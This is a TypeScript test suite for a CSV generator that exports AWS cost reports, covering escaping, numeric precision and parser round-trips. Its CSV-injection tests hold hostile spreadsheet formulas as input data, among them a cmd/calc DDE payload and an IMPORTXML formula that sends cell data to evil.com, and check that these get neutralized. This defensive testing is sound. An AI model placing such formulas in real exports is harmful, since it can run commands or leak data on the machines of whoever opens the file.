import { describe, it, expect } from "vitest";
import { parse } from "csv-parse/sync";
import { generateCsv } from "./csv-generator.js";
import type { CostReport } from "../types.js";

type CsvRecord = { "Resource Name": string; Service: string; Region: string; Cost: string };

describe("generateCsv", () => {
  it("should generate CSV with 4-column header and resources in order", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 150.34,
      costsByResource: [
        { resourceName: "i-1234567890abcdef0", serviceName: "Amazon EC2", region: "us-east-1", cost: "100.00" },
        { resourceName: "my-bucket", serviceName: "Amazon S3", region: "us-west-2", cost: "50.34" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[0]).toBe("Resource Name,Service,Region,Cost");
    expect(lines[1]).toBe("i-1234567890abcdef0,Amazon EC2,us-east-1,100.00");
    expect(lines[2]).toBe("my-bucket,Amazon S3,us-west-2,50.34");
    expect(lines.length).toBe(3);
  });

  it("should return header only for empty costsByResource", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 0,
      costsByResource: [],
    };

    const csv = generateCsv(report);
    expect(csv).toBe("Resource Name,Service,Region,Cost");
  });

  it("should output full precision costs (no rounding)", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 0.0000005793,
      costsByResource: [
        { resourceName: "resource-1", serviceName: "Service", region: "us-east-1", cost: "0.0000005793" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[1]).toBe("resource-1,Service,us-east-1,0.0000005793");
  });

  it("should handle 15 decimal place precision", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 0.123456789012345,
      costsByResource: [
        { resourceName: "resource-1", serviceName: "Service", region: "us-east-1", cost: "0.123456789012345" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[1]).toBe("resource-1,Service,us-east-1,0.123456789012345");
  });

  it("should escape resource names with commas", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 25.0,
      costsByResource: [
        { resourceName: "resource, with comma", serviceName: "Amazon EC2", region: "us-east-1", cost: "25.00" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[1]).toBe('"resource, with comma",Amazon EC2,us-east-1,25.00');
  });

  it("should escape service names with commas", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 25.0,
      costsByResource: [
        { resourceName: "resource-1", serviceName: "Service, with comma", region: "us-east-1", cost: "25.00" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[1]).toBe('resource-1,"Service, with comma",us-east-1,25.00');
  });

  it("should escape resource names with quotes", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 30.0,
      costsByResource: [
        { resourceName: 'resource "quoted"', serviceName: "Service", region: "us-east-1", cost: "30.00" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[1]).toBe('"resource ""quoted""",Service,us-east-1,30.00');
  });

  it("should escape resource names with newlines", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 40.0,
      costsByResource: [
        { resourceName: "resource\nLine2", serviceName: "Service", region: "us-east-1", cost: "40.00" },
      ],
    };

    const csv = generateCsv(report);
    expect(csv).toBe('Resource Name,Service,Region,Cost\n"resource\nLine2",Service,us-east-1,40.00');
  });

  it("should preserve order of pre-sorted resources", () => {
    const report: CostReport = {
      accountId: "123456789012",
      startDate: "2026-01-15",
      endDate: "2026-02-03",
      totalCost: 300.0,
      costsByResource: [
        { resourceName: "r1", serviceName: "EC2", region: "us-east-1", cost: "200.00" },
        { resourceName: "r2", serviceName: "EC2", region: "us-west-2", cost: "50.00" },
        { resourceName: "r3", serviceName: "S3", region: "us-east-1", cost: "40.00" },
        { resourceName: "r4", serviceName: "Lambda", region: "us-east-1", cost: "10.00" },
      ],
    };

    const csv = generateCsv(report);
    const lines = csv.split("\n");

    expect(lines[1]).toBe("r1,EC2,us-east-1,200.00");
    expect(lines[2]).toBe("r2,EC2,us-west-2,50.00");
    expect(lines[3]).toBe("r3,S3,us-east-1,40.00");
    expect(lines[4]).toBe("r4,Lambda,us-east-1,10.00");
  });

  describe("CSV roundtrip validation", () => {
    it("should generate CSV that can be parsed back correctly", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 150.5,
        costsByResource: [
          { resourceName: "i-1234567890abcdef0", serviceName: "EC2", region: "us-east-1", cost: "100.00" },
          { resourceName: "bucket, with comma", serviceName: "S3", region: "us-west-2", cost: "50.50" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(2);
      expect(records[0]["Resource Name"]).toBe("i-1234567890abcdef0");
      expect(records[0].Service).toBe("EC2");
      expect(records[0].Region).toBe("us-east-1");
      expect(records[0].Cost).toBe("100.00");
      expect(records[1]["Resource Name"]).toBe("bucket, with comma");
      expect(records[1].Service).toBe("S3");
      expect(records[1].Region).toBe("us-west-2");
      expect(records[1].Cost).toBe("50.50");
    });

    it("should roundtrip resource names with commas", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 25.0,
        costsByResource: [
          { resourceName: "resource, with comma", serviceName: "Service", region: "us-east-1", cost: "25.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe("resource, with comma");
      expect(records[0].Cost).toBe("25.00");
    });

    it("should roundtrip resource names with quotes", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 30.0,
        costsByResource: [
          { resourceName: 'resource "quoted"', serviceName: "Service", region: "us-east-1", cost: "30.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe('resource "quoted"');
      expect(records[0].Cost).toBe("30.00");
    });

    it("should roundtrip resource names with newlines", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 40.0,
        costsByResource: [
          { resourceName: "resource\nLine2", serviceName: "Service", region: "us-east-1", cost: "40.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe("resource\nLine2");
      expect(records[0].Cost).toBe("40.00");
    });

    it("should roundtrip all special characters combined", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 45.0,
        costsByResource: [
          { resourceName: 'resource "quoted", Type\nA', serviceName: "Service", region: "us-east-1", cost: "45.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe('resource "quoted", Type\nA');
      expect(records[0].Cost).toBe("45.00");
    });

    it("should roundtrip multiple resources with various special characters", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 300.0,
        costsByResource: [
          { resourceName: "Normal Resource", serviceName: "Service1", region: "us-east-1", cost: "100.00" },
          { resourceName: "resource, with comma", serviceName: "Service2", region: "us-west-2", cost: "75.00" },
          { resourceName: 'resource "quoted"', serviceName: "Service3", region: "eu-west-1", cost: "50.00" },
          { resourceName: "resource\nwith newline", serviceName: "Service4", region: "ap-southeast-1", cost: "40.00" },
          { resourceName: 'Complex "Resource", Line\n2', serviceName: "Service5", region: "global", cost: "35.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(5);
      expect(records[0]["Resource Name"]).toBe("Normal Resource");
      expect(records[0].Cost).toBe("100.00");
      expect(records[1]["Resource Name"]).toBe("resource, with comma");
      expect(records[1].Cost).toBe("75.00");
      expect(records[2]["Resource Name"]).toBe('resource "quoted"');
      expect(records[2].Cost).toBe("50.00");
      expect(records[3]["Resource Name"]).toBe("resource\nwith newline");
      expect(records[3].Cost).toBe("40.00");
      expect(records[4]["Resource Name"]).toBe('Complex "Resource", Line\n2');
      expect(records[4].Cost).toBe("35.00");
    });

    it("should be RFC 4180 compliant in strict mode", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 150.0,
        costsByResource: [
          { resourceName: "i-1234567890abcdef0", serviceName: "Amazon EC2", region: "us-east-1", cost: "100.00" },
          { resourceName: "my-bucket", serviceName: "Amazon S3", region: "us-west-2", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);

      // RFC 4180 strict mode parsing should succeed
      const records = parse(csv, {
        columns: true,
        skip_empty_lines: true,
        relax_column_count: false,
        relax_quotes: false,
      }) as CsvRecord[];

      expect(records).toHaveLength(2);
      expect(records[0]).toEqual({
        "Resource Name": "i-1234567890abcdef0",
        Service: "Amazon EC2",
        Region: "us-east-1",
        Cost: "100.00",
      });
      expect(records[1]).toEqual({
        "Resource Name": "my-bucket",
        Service: "Amazon S3",
        Region: "us-west-2",
        Cost: "50.00",
      });
    });

    it("should handle empty costsByResource (header only)", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 0,
        costsByResource: [],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(0);
    });

    it("should roundtrip very long resource names", () => {
      const longName = "A".repeat(1000);
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [{ resourceName: longName, serviceName: "Service", region: "us-east-1", cost: "50.00" }],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe(longName);
      expect(records[0].Cost).toBe("50.00");
    });

    it("should roundtrip large number of resources (200+)", () => {
      const costsByResource = Array.from({ length: 250 }, (_, i) => ({
        resourceName: `resource-${i + 1}`,
        serviceName: `Amazon Service ${i + 1}`,
        region: "us-east-1",
        cost: ((i + 1) * 10.5).toString(),
      }));

      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: costsByResource.reduce((sum, s) => sum + parseFloat(s.cost), 0),
        costsByResource,
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(250);
      expect(records[0]["Resource Name"]).toBe("resource-1");
      expect(records[0].Cost).toBe("10.5");
      expect(records[249]["Resource Name"]).toBe("resource-250");
      expect(records[249].Cost).toBe("2625");
    });

    it("should preserve full precision after roundtrip", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 123.456789012345,
        costsByResource: [
          { resourceName: "r1", serviceName: "Service1", region: "us-east-1", cost: "0.0000000001" },
          { resourceName: "r2", serviceName: "Service2", region: "us-east-1", cost: "0.123456789012345" },
          { resourceName: "r3", serviceName: "Service3", region: "us-east-1", cost: "10.5" },
          { resourceName: "r4", serviceName: "Service4", region: "us-east-1", cost: "9999999999.99" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(4);
      expect(records[0].Cost).toBe("0.0000000001");
      expect(records[1].Cost).toBe("0.123456789012345");
      expect(records[2].Cost).toBe("10.5");
      expect(records[3].Cost).toBe("9999999999.99");
    });

    it("should handle carriage returns (CRLF) in resource names", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 60.0,
        costsByResource: [
          { resourceName: "resource\r\nWith CRLF", serviceName: "Service", region: "us-east-1", cost: "60.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe("resource\r\nWith CRLF");
      expect(records[0].Cost).toBe("60.00");
    });

    it("should handle tab characters in resource names", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 70.0,
        costsByResource: [
          { resourceName: "resource\tWith Tab", serviceName: "Service", region: "us-east-1", cost: "70.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe("resource\tWith Tab");
      expect(records[0].Cost).toBe("70.00");
    });

    it("should handle Unicode characters in resource names", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 80.0,
        costsByResource: [
          { resourceName: "resource 🚀 Unicode ™", serviceName: "Service", region: "us-east-1", cost: "80.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe("resource 🚀 Unicode ™");
      expect(records[0].Cost).toBe("80.00");
    });

    it("should handle consecutive quotes in resource names", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 90.0,
        costsByResource: [
          { resourceName: 'resource ""Multiple"" Quotes', serviceName: "Service", region: "us-east-1", cost: "90.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe('resource ""Multiple"" Quotes');
      expect(records[0].Cost).toBe("90.00");
    });
  });

  describe("fallback text scenarios", () => {
    it("should handle fallback text for services without resource granularity", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 100.0,
        costsByResource: [
          { resourceName: "No resource breakdown available for this service type", serviceName: "Amazon GuardDuty", region: "us-east-1", cost: "100.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      expect(records[0]["Resource Name"]).toBe("No resource breakdown available for this service type");
      expect(records[0].Service).toBe("Amazon GuardDuty");
    });

    it("should handle fallback text for time window limitations", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-01",
        endDate: "2026-02-03",
        totalCost: 200.0,
        costsByResource: [
          { resourceName: "i-1234567890abcdef0", serviceName: "Amazon EC2", region: "us-east-1", cost: "100.00" },
          { resourceName: "No resource breakdown available for this time window", serviceName: "Amazon EC2", region: "global", cost: "100.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(2);
      expect(records[0]["Resource Name"]).toBe("i-1234567890abcdef0");
      expect(records[1]["Resource Name"]).toBe("No resource breakdown available for this time window");
    });
  });

  describe("CSV injection prevention", () => {
    it("should neutralize formula injection with = prefix", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [
          { resourceName: "=cmd|'/c calc'!A1", serviceName: "Amazon EC2", region: "us-east-1", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      // Should be prefixed with single quote to neutralize formula
      expect(lines[1]).toBe("'=cmd|'/c calc'!A1,Amazon EC2,us-east-1,50.00");
    });

    it("should neutralize formula injection with + prefix", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 10.0,
        costsByResource: [
          { resourceName: "+1+1", serviceName: "Service", region: "us-east-1", cost: "10.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("'+1+1,Service");
    });

    it("should neutralize formula injection with - prefix", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 10.0,
        costsByResource: [
          { resourceName: "-1-1", serviceName: "Service", region: "us-east-1", cost: "10.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("'-1-1,Service");
    });

    it("should neutralize formula injection with @ prefix", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 10.0,
        costsByResource: [
          { resourceName: "@SUM(A1:A10)", serviceName: "Service", region: "us-east-1", cost: "10.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("'@SUM(A1:A10),Service");
    });

    it("should neutralize formula injection with | prefix", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 10.0,
        costsByResource: [
          { resourceName: "|calc", serviceName: "Service", region: "us-east-1", cost: "10.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("'|calc,Service");
    });

    it("should neutralize formula injection with % prefix", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 10.0,
        costsByResource: [
          { resourceName: "%calc", serviceName: "Service", region: "us-east-1", cost: "10.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("'%calc,Service");
    });

    it("should handle IMPORTXML injection attempts", () => {
      const maliciousPayload = '=IMPORTXML(CONCAT("http://evil.com/log?data=",A1),"//*")';
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 100.0,
        costsByResource: [
          { resourceName: maliciousPayload, serviceName: "Lambda", region: "us-east-1", cost: "100.00" },
        ],
      };

      const csv = generateCsv(report);
      // Should be prefixed with single quote AND wrapped in quotes due to comma
      // Internal double quotes are escaped per RFC 4180 (doubled to "")
      expect(csv).toContain(`"'=IMPORTXML(CONCAT(""http://evil.com/log?data="",A1),""//*"")"`);
    });

    it("should not alter values that don't start with formula characters", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 100.0,
        costsByResource: [
          { resourceName: "normal-resource", serviceName: "Service", region: "us-east-1", cost: "50.00" },
          { resourceName: "resource-with-=equals", serviceName: "Service", region: "us-east-1", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      // First resource should be unchanged
      expect(lines[1]).toBe("normal-resource,Service,us-east-1,50.00");
      // Second resource has = in middle, should be unchanged
      expect(lines[2]).toBe("resource-with-=equals,Service,us-east-1,50.00");
    });

    it("should apply injection protection to service names", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [
          { resourceName: "resource-1", serviceName: "=MALICIOUS", region: "us-east-1", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("resource-1,'=MALICIOUS,us-east-1");
    });

    it("should apply injection protection to region names", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [
          { resourceName: "resource-1", serviceName: "Service", region: "=BAD", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      expect(csv).toContain("resource-1,Service,'=BAD,50.00");
    });

    it("should apply injection protection combined with RFC 4180 escaping", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [
          { resourceName: '=cmd, "with quotes"', serviceName: "Service", region: "us-east-1", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      // Should have single quote prefix, then RFC 4180 escaping
      expect(csv).toContain(`"'=cmd, ""with quotes"""`);
    });

    it("should roundtrip formula-prefixed values through csv-parse", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [
          { resourceName: "=cmd|'/c calc'!A1", serviceName: "Service", region: "us-east-1", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      const records = parse(csv, { columns: true, skip_empty_lines: true }) as CsvRecord[];

      expect(records).toHaveLength(1);
      // The single quote prefix should be preserved in the parsed value
      expect(records[0]["Resource Name"]).toBe("'=cmd|'/c calc'!A1");
    });
  });

  describe("edge cases", () => {
    it("should handle very long resource names", () => {
      const longName = "A".repeat(1000);
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [{ resourceName: longName, serviceName: "Service", region: "us-east-1", cost: "50.00" }],
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      expect(lines[1]).toBe(`${longName},Service,us-east-1,50.00`);
    });

    it("should handle micro-cent costs (very small)", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 0.0000000001,
        costsByResource: [{ resourceName: "resource", serviceName: "Service", region: "us-east-1", cost: "0.0000000001" }],
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      // Full precision preserved
      expect(lines[1]).toBe("resource,Service,us-east-1,0.0000000001");
    });

    it("should handle very large costs (billions)", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 9999999999.99,
        costsByResource: [{ resourceName: "resource", serviceName: "Service", region: "us-east-1", cost: "9999999999.99" }],
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      expect(lines[1]).toBe("resource,Service,us-east-1,9999999999.99");
    });

    it("should handle large number of resources (200+) without excessive memory", () => {
      const costsByResource = Array.from({ length: 250 }, (_, i) => ({
        resourceName: `resource-${i + 1}`,
        serviceName: `Amazon Service ${Math.floor(i / 10) + 1}`,
        region: "us-east-1",
        cost: (Math.random() * 1000).toFixed(10),
      }));

      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: costsByResource.reduce((sum, s) => sum + parseFloat(s.cost), 0),
        costsByResource,
      };

      // Should complete without OOM error
      const csv = generateCsv(report);
      const lines = csv.split("\n");

      // Verify structure
      expect(lines[0]).toBe("Resource Name,Service,Region,Cost");
      expect(lines.length).toBe(251); // header + 250 resources

      // Verify first and last resource
      expect(lines[1]).toMatch(/^resource-1,Amazon Service 1,us-east-1,\d+\.\d+$/);
      expect(lines[250]).toMatch(/^resource-250,Amazon Service 25,us-east-1,\d+\.\d+$/);
    });

    it("should handle resources with special characters efficiently", () => {
      // Test with many resources requiring escaping (worst case for memory)
      const costsByResource = Array.from({ length: 100 }, (_, i) => ({
        resourceName: `resource "Premium", Type ${i + 1}`,
        serviceName: `Service, ${i + 1}`,
        region: "us-east-1",
        cost: (i * 10).toString(),
      }));

      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: costsByResource.reduce((sum, s) => sum + parseFloat(s.cost), 0),
        costsByResource,
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      // Verify all resources are properly escaped
      expect(lines[1]).toBe('"resource ""Premium"", Type 1","Service, 1",us-east-1,0');
      expect(lines[100]).toBe('"resource ""Premium"", Type 100","Service, 100",us-east-1,990');
      expect(lines.length).toBe(101); // header + 100 resources
    });

    it("should handle empty resource name", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2024-01-01",
        endDate: "2024-02-01",
        totalCost: 12.34,
        costsByResource: [{ resourceName: "", serviceName: "Service", region: "us-east-1", cost: "12.34" }],
      };
      const csv = generateCsv(report);
      expect(csv).toBe("Resource Name,Service,Region,Cost\n,Service,us-east-1,12.34");

      // Verify it can be parsed back correctly
      const records = parse(csv, {
        columns: true,
        skip_empty_lines: true,
      }) as CsvRecord[];
      expect(records[0]["Resource Name"]).toBe("");
      expect(records[0].Cost).toBe("12.34");
    });

    it("should handle global region", () => {
      const report: CostReport = {
        accountId: "123456789012",
        startDate: "2026-01-15",
        endDate: "2026-02-03",
        totalCost: 50.0,
        costsByResource: [
          { resourceName: "resource-1", serviceName: "AWS CloudTrail", region: "global", cost: "50.00" },
        ],
      };

      const csv = generateCsv(report);
      const lines = csv.split("\n");

      expect(lines[1]).toBe("resource-1,AWS CloudTrail,global,50.00");
    });
  });
});
